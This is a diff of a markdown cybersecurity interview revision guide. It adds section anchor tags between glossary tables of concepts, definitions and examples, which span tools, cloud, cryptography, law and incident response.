 | 300. Zero Day Attack | Exploiting unknown, unpatched vulnerability | Stuxnet (multiple zero-days), Log4Shell |
 
+<div id="guide-page-quick-tools"></div>
+
 ### Tools & Commands (301–400)
 
 !!! note "Format: concept, answer, example, or tool"
@@ -3261,6 +3514,8 @@ This section is designed for fast revision. Each point gives you a short concept
 | 399. Bug Bounty Platform | Service that coordinates vulnerability disclosure between companies and approved researchers | HackerOne, Bugcrowd, or Intigriti managing reports and rewards |
 | 400. Threat Sharing Platform | Allows sharing of IOCs between organizations | MISP, STIX/TAXII, ISACs |
 
+<div id="guide-page-quick-practices"></div>
+
 ### Security Practices (401–500)
 
 !!! note "Format: Point & Concept → Interview Answer → Example / Tool"
@@ -3383,6 +3638,8 @@ This section is designed for fast revision. Each point gives you a short concept
 | 499. Continuous Monitoring | The ongoing, real-time observation of the IT environment to quickly detect threats, misconfigurations, or failures. | A 24/7 SOC monitoring SIEM alerts and endpoint telemetry |
 | 500. Security Improvement | The iterative process of learning from incidents, audits, and metrics to continually strengthen defences. | Updating incident runbooks after a tabletop exercise reveals a communication gap |
 
+<div id="guide-page-quick-domains"></div>
+
 ### Domains & Kill Chain (501–600)
 
 !!! note "Format: Point & Concept → Interview Answer → Example / Tool"
@@ -3502,6 +3759,8 @@ This section is designed for fast revision. Each point gives you a short concept
 | 599. Attack Completion | Stage where the attacker has achieved the primary objective and begins disengaging or preparing exit. | Exfiltration complete; ransomware deployed; tools removed |
 | 600. Post-Attack Analysis | Review performed by defenders after the attack to understand timeline, root cause, and missed detections. | After-action report mapping attacker timeline to detection gaps |
 
+<div id="guide-page-quick-cloud"></div>
+
 ### Cloud & Infrastructure (601–700)
 
 !!! note "Format: Point & Concept → Interview Answer → Example / Tool"
@@ -3620,6 +3879,8 @@ are replaced rather than changed once they have been deployed. | Triggering a Te
 | 699. Cloud Cost Optimisation | The ongoing process of ensuring you only pay for the cloud resources you actually need, often driven by tagging and automation. | Ensuring non-production development environments automatically shut down over the weekend |
 | 700. Cloud Resource Tagging | Applying metadata (labels) to cloud resources to help identify their owner, environment, or purpose, aiding both billing and security incident response. | Adding the tag `Environment=Production` and `Owner=SecurityTeam` to a firewall |
 
+<div id="guide-page-quick-cryptography"></div>
+
 ### Cryptography (701–800)
 
 !!! note "Format: concept, answer, example, or tool"
@@ -3687,6 +3948,8 @@ are replaced rather than changed once they have been deployed. | Triggering a Te
 | 749. Cryptographic Attacks | Techniques that try to break confidentiality or integrity by exploiting weak algorithms, keys, implementations, or side channels. | Brute-force, padding-oracle, and timing attacks |
 | 750. Cryptanalysis | Study and practice of analyzing ciphers and protocols to find weaknesses or recover secrets. | Researchers testing a new encryption scheme for flaws |
 
+<div id="guide-page-quick-laws"></div>
+
 ### Laws & Global Standards (801–900)
 
 !!! note "Format: concept, answer, example, or tool"
@@ -3753,6 +4016,8 @@ are replaced rather than changed once they have been deployed. | Triggering a Te
 | 798. Security certification | Formal recognition that a person, process, or system has met a defined security standard. | ISO certification or product evaluation |
 | 799. Compliance monitoring | Ongoing review that checks whether controls continue to meet legal, regulatory, and contractual duties. | Continuous control monitoring dashboard |
 | 800. Legal enforcement | Actions taken by regulators, courts, or contract parties when obligations are violated. | Fines, corrective orders, or litigation |
+
+<div id="guide-page-quick-advanced"></div>
 
 ### Advanced Topics (901–1000)
 
@@ -3871,6 +4136,8 @@ are replaced rather than changed once they have been deployed. | Triggering a Te
 | 999. CISO | Chief Information Security Officer — the senior executive responsible for enterprise security strategy, governance, and risk communication. | CISO presenting board-level risk posture, program investment, and ransomware readiness |
 | 1000. Cybersecurity Professional | Anyone working in technical, governance, or leadership security roles — a broad term covering the full spectrum of the field. | Analyst, engineer, auditor, responder, compliance lead, or security architect |
 
+<div id="guide-page-quick-incident"></div>
+
 ### Incident & DR Operations (1001–1100)
 
 !!! note "Format: Point & Concept → Interview Answer → Example / Tool"
@@ -3987,6 +4254,8 @@ are replaced rather than changed once they have been deployed. | Triggering a Te
 | 1098. Fault Tolerance | A system's capacity to continue operating without any interruption when one or more of its components fail. | A RAID 1 mirrored hard drive array surviving a physical disk crash without dropping a single packet |
 | 1099. Failover | The automatic or manual seamless switching to a redundant or standby system upon the failure of the primary system. | The primary database crashes, and connections instantly route to the secondary node |
 | 1100. Post-Incident Reporting | The formal document provided to stakeholders detailing the timeline, impact, and remediation steps taken during the incident. | Delivered to regulators or cyber-insurance providers within specific time limits |
+
+<div id="guide-page-quick-expert"></div>
 
 ### Expert Edge (1101–1200)
 
